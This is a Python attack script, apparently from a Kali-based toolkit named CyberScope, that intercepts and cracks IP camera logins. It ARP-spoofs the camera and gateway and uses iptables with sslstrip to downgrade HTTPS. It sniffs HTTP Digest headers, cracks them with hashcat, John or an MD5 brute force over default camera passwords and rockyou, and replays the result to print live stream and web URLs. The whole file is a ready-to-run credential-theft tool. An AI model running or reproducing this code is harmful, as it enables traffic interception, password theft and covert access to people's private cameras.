#!/usr/bin/env python3
"""
Camera Credential Interceptor — Full Attack Chain
===================================================
Attack layers (tried in order, stops at first success):

  1. Passive sniff  — capture Digest hash without MITM (if traffic is unencrypted)
  2. Active MITM    — ARP spoof both directions, force traffic through us
  3. SSL strip      — iptables redirect 443→8080, sslstrip downgrades HTTPS→HTTP
  4. Scapy sniffer  — raw packet capture of Authorization headers (faster than tshark)
  5. Hashcat 11000  — crack HTTP Digest MD5 hash with rockyou
  6. John fallback  — --format=HTTP-Digest with rockyou
  7. Offline brute  — recompute HA1=MD5(user:realm:pwd) directly in Python (no hashcat needed)
  8. Replay attack  — verify cracked password by replaying the request to the camera

Run: python3 kali_tools/cam_interceptor.py <camera_ip> [duration_seconds]
"""

import hashlib
import os
import re
import subprocess
import sys
import time
import threading
from itertools import product

# ── Config ────────────────────────────────────────────────────────────────────
SUDO_PASS = os.environ.get("CYBERSCOPE_SUDO_PASS", "")
IFACE     = "wlan0"
WORDLIST  = "/usr/share/wordlists/rockyou.txt"

# Common camera passwords — tried first before rockyou (fast path)
FAST_PASSWORDS = [
    "", "12345", "admin", "admin123", "Admin123", "Admin@123",
    "hik12345", "Hik12345", "12345678", "password", "123456",
    "123456789", "1234567890", "admin1234", "Admin1234",
    "admin@123", "Hikvision", "hikvision", "camera", "Camera123",
    "nvr12345", "Nvr12345", "admin12345", "Admin12345",
    "Hik@12345", "hik@12345", "ipcam", "IPCam", "supervisor",
    "888888", "666666", "111111", "000000", "pass", "Pass1234",
]

USERNAMES = ["admin", "operator", "user", "guest", "root", "service"]


# ── Sudo helper ───────────────────────────────────────────────────────────────
def _sudo(args, **kwargs):
    """Run command with sudo via stdin pipe — no shell injection."""
    proc = subprocess.Popen(
        ["sudo", "-S"] + args,
        stdin=subprocess.PIPE,
        stdout=kwargs.pop("stdout", subprocess.DEVNULL),
        stderr=kwargs.pop("stderr", subprocess.DEVNULL),
        **kwargs,
    )
    if SUDO_PASS:
        try:
            proc.stdin.write((SUDO_PASS + "\n").encode())
            proc.stdin.flush()
        except Exception:
            pass
    return proc


def _sudo_out(args, timeout=10):
    """Run sudo command and return stdout text."""
    try:
        proc = _sudo(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        out, _ = proc.communicate(timeout=timeout)
        return out.decode(errors="ignore")
    except Exception:
        return ""


# ── Network helpers ───────────────────────────────────────────────────────────
def get_gateway():
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
        m = re.search(r"default via ([\d.]+)", out)
        return m.group(1) if m else "192.168.31.1"
    except Exception:
        return "192.168.31.1"


def get_my_ip():
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show", IFACE], text=True)
        m = re.search(r"inet ([\d.]+)/", out)
        return m.group(1) if m else ""
    except Exception:
        return ""


# ── Attack Layer 1 & 2: ARP Spoof MITM ───────────────────────────────────────
def enable_ip_forward():
    _sudo(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"]).wait()


def disable_ip_forward():
    _sudo(["bash", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"]).wait()


def start_mitm(target_ip, gateway_ip):
    """ARP spoof both directions so all traffic flows through us."""
    p1 = _sudo(["arpspoof", "-i", IFACE, "-t", target_ip, gateway_ip])
    p2 = _sudo(["arpspoof", "-i", IFACE, "-t", gateway_ip, target_ip])
    return p1, p2


# ── Attack Layer 3: SSL Strip ─────────────────────────────────────────────────
_sslstrip_proc = None

def start_sslstrip():
    """
    Redirect port 443 → 8080 via iptables and launch sslstrip.
    Downgrades HTTPS to HTTP so Digest headers become visible.
    """
    global _sslstrip_proc
    # iptables redirect
    _sudo(["iptables", "-t", "nat", "-A", "PREROUTING",
           "-p", "tcp", "--destination-port", "443",
           "-j", "REDIRECT", "--to-port", "8080"]).wait()
    try:
        _sslstrip_proc = subprocess.Popen(
            ["sslstrip", "-l", "8080"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        print("[+] SSLstrip running on port 8080 — HTTPS will be downgraded")
    except FileNotFoundError:
        print("[!] sslstrip not found — skipping SSL strip (install: pip install sslstrip)")


def stop_sslstrip():
    global _sslstrip_proc
    _sudo(["iptables", "-t", "nat", "-D", "PREROUTING",
           "-p", "tcp", "--destination-port", "443",
           "-j", "REDIRECT", "--to-port", "8080"]).wait()
    if _sslstrip_proc:
        _sslstrip_proc.terminate()
        _sslstrip_proc = None


# ── Attack Layer 4: Scapy raw sniffer ────────────────────────────────────────
_captured_hash = None
_sniff_stop    = threading.Event()

def _scapy_sniff(target_ip, timeout):
    """
    Raw packet sniffer using Scapy — extracts Authorization: Digest headers
    directly from TCP payloads without needing tshark.
    """
    global _captured_hash
    try:
        from scapy.all import sniff, IP, TCP, Raw
    except ImportError:
        print("[!] Scapy not available for raw sniff — falling back to tshark")
        return

    def process(pkt):
        global _captured_hash
        if _captured_hash:
            return
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
            return
        if pkt[IP].src != target_ip and pkt[IP].dst != target_ip:
            return
        payload = pkt[Raw].load.decode(errors="ignore")
        if "Authorization: Digest" in payload:
            # Extract the Authorization header
            m = re.search(r"Authorization: (Digest [^\r\n]+)", payload)
            if m:
                auth = m.group(1)
                # Extract HTTP method and URI from request line
                method_m = re.match(r"([A-Z]+) ([^\s]+)", payload)
                method = method_m.group(1) if method_m else "GET"
                uri    = method_m.group(2) if method_m else "/"
                print(f"\n[+] Scapy captured Digest auth from {pkt[IP].src}")
                _captured_hash = _parse_digest(auth, method, uri)
                _sniff_stop.set()

    sniff(
        iface=IFACE,
        filter=f"host {target_ip} and tcp",
        prn=process,
        store=False,
        timeout=timeout,
        stop_filter=lambda _: _sniff_stop.is_set(),
    )


def _tshark_sniff(target_ip, duration):
    """Fallback tshark sniffer — captures both port 80 and 8080 (sslstripped)."""
    global _captured_hash
    try:
        out = subprocess.check_output(
            [
                "tshark", "-i", IFACE,
                "-f", f"host {target_ip} and (tcp port 80 or tcp port 8080)",
                "-Y", "http.authorization",
                "-T", "fields",
                "-e", "ip.src",
                "-e", "http.authorization",
                "-e", "http.request.method",
                "-e", "http.request.uri",
                "-a", f"duration:{duration}",
            ],
            stderr=subprocess.DEVNULL, text=True, timeout=duration + 5
        )
        for line in out.splitlines():
            parts = line.strip().split("\t")
            if len(parts) >= 2 and "Digest" in parts[1]:
                method = parts[2] if len(parts) > 2 else "GET"
                uri    = parts[3] if len(parts) > 3 else "/"
                print(f"[+] tshark captured Digest auth from {parts[0]}")
                _captured_hash = _parse_digest(parts[1], method, uri)
                return
    except Exception as e:
        print(f"[-] tshark error: {e}")


def capture_hash(target_ip, duration=300):
    """
    Run Scapy sniffer + tshark in parallel.
    First one to capture a hash wins.
    """
    global _captured_hash, _sniff_stop
    _captured_hash = None
    _sniff_stop.clear()

    print(f"[*] Sniffing traffic from {target_ip} (HTTP port 80 + sslstripped 8080)...")
    print(f"[*] Open http://{target_ip} in a browser and log in")

    t_scapy  = threading.Thread(target=_scapy_sniff,  args=(target_ip, duration), daemon=True)
    t_tshark = threading.Thread(target=_tshark_sniff, args=(target_ip, duration), daemon=True)
    t_scapy.start()
    t_tshark.start()

    deadline = time.time() + duration
    while time.time() < deadline:
        if _captured_hash:
            _sniff_stop.set()
            return _captured_hash
        time.sleep(1)

    _sniff_stop.set()
    return _captured_hash


# ── Digest parser ─────────────────────────────────────────────────────────────
def _parse_digest(auth_header, method="GET", uri="/"):
    """
    Parse Authorization: Digest header into all fields needed for cracking.
    Returns dict or None.
    """
    def extract(field):
        m = re.search(f'{field}="([^"]+)"', auth_header)
        if m:
            return m.group(1)
        m = re.search(f'{field}=([^,\\s]+)', auth_header)
        return m.group(1).strip('"') if m else ""

    username = extract("username")
    realm    = extract("realm")
    nonce    = extract("nonce")
    uri_val  = extract("uri") or uri
    nc       = extract("nc")
    cnonce   = extract("cnonce")
    response = extract("response")
    qop      = extract("qop")

    if not all([username, realm, nonce, response]):
        print(f"[-] Incomplete Digest fields — skipping")
        return None

    # Hashcat mode 11000 format: user:realm:nonce:uri:nc:cnonce:qop:response
    hashcat_hash = f"{username}:{realm}:{nonce}:{uri_val}:{nc}:{cnonce}:{qop}:{response}"

    print(f"[+] Username : {username}")
    print(f"[+] Realm    : {realm}")
    print(f"[+] Nonce    : {nonce[:20]}...")
    print(f"[+] Response : {response}")

    return {
        "username": username, "realm": realm,
        "nonce": nonce,       "uri":   uri_val,
        "nc": nc,             "cnonce": cnonce,
        "qop": qop,           "response": response,
        "method": method,     "hash": hashcat_hash,
    }


# ── Attack Layer 5: Hashcat mode 11000 ───────────────────────────────────────
def crack_hashcat(hash_data):
    """Crack HTTP Digest MD5 with hashcat mode 11000."""
    hash_file    = "/tmp/cam_hash.txt"
    cracked_file = "/tmp/cam_cracked.txt"

    for f in [hash_file, cracked_file]:
        if os.path.exists(f):
            os.remove(f)

    with open(hash_file, "w") as f:
        f.write(hash_data["hash"] + "\n")

    print("[*] Hashcat mode 11000 (HTTP Digest MD5)...")
    try:
        r = subprocess.run(
            ["hashcat", "-m", "11000", hash_file, WORDLIST,
             "--force", "-o", cracked_file, "--quiet", "--status-timer=5"],
            capture_output=True, timeout=300
        )
        if os.path.exists(cracked_file):
            line = open(cracked_file).read().strip()
            if line:
                password = line.rsplit(":", 1)[-1]
                print(f"[+] Hashcat cracked: {hash_data['username']}:{password}")
                return password
    except subprocess.TimeoutExpired:
        print("[-] Hashcat timed out")
    except FileNotFoundError:
        print("[-] hashcat not installed")
    except Exception as e:
        print(f"[-] Hashcat error: {e}")
    return None


# ── Attack Layer 6: John the Ripper ──────────────────────────────────────────
def crack_john(hash_data):
    """Crack HTTP Digest with john --format=HTTP-Digest."""
    d = hash_data
    # John HTTP-Digest format
    john_hash = (
        f"{d['username']}:$response${d['nonce']}*{d['cnonce']}*"
        f"{d['nc']}*{d['qop']}*{d['realm']}*{d['uri']}*{d['response']}"
    )
    john_file = "/tmp/cam_john.txt"
    if os.path.exists(john_file):
        os.remove(john_file)
    with open(john_file, "w") as f:
        f.write(john_hash + "\n")

    print("[*] John the Ripper (--format=HTTP-Digest)...")
    try:
        subprocess.run(
            ["john", john_file, f"--wordlist={WORDLIST}", "--format=HTTP-Digest"],
            capture_output=True, timeout=180
        )
        show = subprocess.check_output(
            ["john", "--show", "--format=HTTP-Digest", john_file],
            stderr=subprocess.DEVNULL, text=True, timeout=10
        )
        for line in show.splitlines():
            if ":" in line and not line.startswith("0 "):
                parts = line.split(":")
                if len(parts) >= 2 and parts[0] == d["username"]:
                    print(f"[+] John cracked: {parts[0]}:{parts[1]}")
                    return parts[1]
    except subprocess.TimeoutExpired:
        print("[-] John timed out")
    except FileNotFoundError:
        print("[-] john not installed")
    except Exception as e:
        print(f"[-] John error: {e}")
    return None


# ── Attack Layer 7: Offline MD5 brute force ───────────────────────────────────
def _compute_digest_response(username, realm, password, nonce, uri, nc, cnonce, qop, method):
    """
    Recompute the Digest response hash from scratch.
    HA1 = MD5(username:realm:password)
    HA2 = MD5(method:uri)
    response = MD5(HA1:nonce:nc:cnonce:qop:HA2)  [with qop]
             = MD5(HA1:nonce:HA2)                 [without qop]
    """
    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    if qop in ("auth", "auth-int"):
        resp = hashlib.md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}".encode()).hexdigest()
    else:
        resp = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
    return resp


def crack_offline(hash_data):
    """
    Pure Python offline brute force — recomputes MD5 for each candidate.
    No hashcat/john needed. Tries FAST_PASSWORDS first, then rockyou.
    """
    d = hash_data
    print("[*] Offline MD5 brute force (no external tools needed)...")

    def try_password(pwd):
        computed = _compute_digest_response(
            d["username"], d["realm"], pwd,
            d["nonce"], d["uri"], d["nc"], d["cnonce"], d["qop"], d["method"]
        )
        return computed == d["response"]

    # Fast path: known camera passwords
    print(f"[*] Trying {len(FAST_PASSWORDS)} known camera passwords...")
    for pwd in FAST_PASSWORDS:
        if try_password(pwd):
            print(f"[+] Offline brute cracked: {d['username']}:{pwd}")
            return pwd

    # Slow path: rockyou wordlist
    if os.path.exists(WORDLIST):
        print(f"[*] Trying rockyou wordlist ({WORDLIST})...")
        try:
            with open(WORDLIST, "r", errors="ignore") as wf:
                for i, line in enumerate(wf):
                    pwd = line.rstrip("\n")
                    if try_password(pwd):
                        print(f"[+] Offline brute cracked (rockyou line {i}): {d['username']}:{pwd}")
                        return pwd
                    if i % 100000 == 0 and i > 0:
                        print(f"[*] Tried {i:,} passwords...")
        except Exception as e:
            print(f"[-] Wordlist error: {e}")
    else:
        print(f"[-] Wordlist not found: {WORDLIST}")

    return None


# ── Attack Layer 8: Replay verification ──────────────────────────────────────
def verify_password(target_ip, username, password, port=80):
    """
    Replay the cracked credentials against the camera to confirm access.
    Tries Digest auth first, then Basic auth.
    """
    import urllib.request
    import urllib.error

    endpoints = [
        f"http://{target_ip}:{port}/ISAPI/System/deviceInfo",
        f"http://{target_ip}:{port}/",
        f"http://{target_ip}:{port}/doc/page/login.asp",
    ]

    try:
        import requests
        from requests.auth import HTTPDigestAuth, HTTPBasicAuth
        for url in endpoints:
            try:
                r = requests.get(url, auth=HTTPDigestAuth(username, password),
                                 timeout=5, verify=False)
                if r.status_code == 200:
                    print(f"[+] Replay CONFIRMED (Digest): {username}:{password} → {url}")
                    return True
                r2 = requests.get(url, auth=HTTPBasicAuth(username, password),
                                  timeout=5, verify=False)
                if r2.status_code == 200:
                    print(f"[+] Replay CONFIRMED (Basic): {username}:{password} → {url}")
                    return True
            except Exception:
                pass
    except ImportError:
        pass

    print(f"[-] Replay failed — camera may have changed nonce or is unreachable")
    return False


# ── Master crack pipeline ─────────────────────────────────────────────────────
def crack_all(hash_data, target_ip, port=80):
    """
    Try all cracking methods in order. Return cracked password or None.
    """
    if not hash_data:
        return None

    username = hash_data["username"]

    # Layer 5: hashcat
    pwd = crack_hashcat(hash_data)
    if pwd:
        verify_password(target_ip, username, pwd, port)
        return {"username": username, "password": pwd, "method": "hashcat"}

    # Layer 6: john
    pwd = crack_john(hash_data)
    if pwd:
        verify_password(target_ip, username, pwd, port)
        return {"username": username, "password": pwd, "method": "john"}

    # Layer 7: offline MD5 (always works, no external tools)
    pwd = crack_offline(hash_data)
    if pwd:
        verify_password(target_ip, username, pwd, port)
        return {"username": username, "password": pwd, "method": "offline_md5"}

    return None


# ── Passive sniff (no MITM) ───────────────────────────────────────────────────
def passive_sniff(target_ip, duration=60):
    """
    Layer 1: Listen passively for Digest auth without ARP spoofing.
    Works if the attacker is already on the same broadcast domain
    and the camera uses HTTP (not HTTPS).
    """
    print(f"[*] Passive sniff for {duration}s (no MITM)...")
    return capture_hash(target_ip, duration)


# ── Full attack pipeline ──────────────────────────────────────────────────────
def intercept_and_crack(target_ip, duration=300, port=80):
    """
    Full attack chain:
      1. Passive sniff (30s) — maybe we get lucky without MITM
      2. ARP MITM + SSL strip
      3. Active sniff for remaining duration
      4. Crack with hashcat → john → offline MD5
      5. Replay verify
    """
    print(f"\n{'='*60}")
    print(f"  CyberScope Camera Interceptor")
    print(f"  Target : {target_ip}:{port}")
    print(f"  Gateway: {get_gateway()}")
    print(f"{'='*60}\n")

    # ── Layer 1: Passive sniff ────────────────────────────────────────────────
    print("[*] Layer 1: Passive sniff (30s)...")
    hash_data = passive_sniff(target_ip, duration=30)
    if hash_data:
        print("[+] Got hash passively — no MITM needed!")
        result = crack_all(hash_data, target_ip, port)
        if result:
            _print_result(target_ip, result)
            return result

    # ── Layer 2: ARP MITM ────────────────────────────────────────────────────
    gateway = get_gateway()
    print(f"\n[*] Layer 2: ARP MITM ({target_ip} ↔ {gateway})...")
    enable_ip_forward()
    p1, p2 = start_mitm(target_ip, gateway)
    time.sleep(2)
    print("[+] MITM active")

    # ── Layer 3: SSL strip ────────────────────────────────────────────────────
    print("[*] Layer 3: SSL strip (443→8080)...")
    start_sslstrip()

    try:
        # ── Layer 4: Active sniff ─────────────────────────────────────────────
        remaining = max(duration - 30, 60)
        print(f"\n[*] Layer 4: Active sniff for {remaining}s...")
        print(f"[*] Open http://{target_ip} in a browser and log in NOW")
        hash_data = capture_hash(target_ip, duration=remaining)

        if not hash_data:
            print("[-] No Digest hash captured")
            print("[-] Possible reasons:")
            print("    • Camera uses HTTPS and sslstrip failed")
            print("    • Nobody logged into the camera during the window")
            print("    • Camera uses a non-standard auth mechanism")
            return None

        # ── Layers 5-7: Crack ─────────────────────────────────────────────────
        result = crack_all(hash_data, target_ip, port)
        if result:
            _print_result(target_ip, result)
            return result

        print("[-] All cracking methods exhausted — password not in wordlist")
        return None

    finally:
        p1.terminate()
        p2.terminate()
        stop_sslstrip()
        disable_ip_forward()
        print("\n[*] MITM stopped, IP forwarding disabled, iptables cleaned")


def _print_result(target_ip, result):
    print(f"\n{'='*60}")
    print(f"  ✓ CAMERA ACCESS GAINED")
    print(f"  IP       : {target_ip}")
    print(f"  Username : {result['username']}")
    print(f"  Password : {result['password']}")
    print(f"  Method   : {result['method']}")
    print(f"  Stream   : rtsp://{result['username']}:{result['password']}@{target_ip}:554/Streaming/Channels/101")
    print(f"  Web UI   : http://{result['username']}:{result['password']}@{target_ip}/")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    target   = sys.argv[1] if len(sys.argv) > 1 else "192.168.31.246"
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 300
    intercept_and_crack(target, duration)
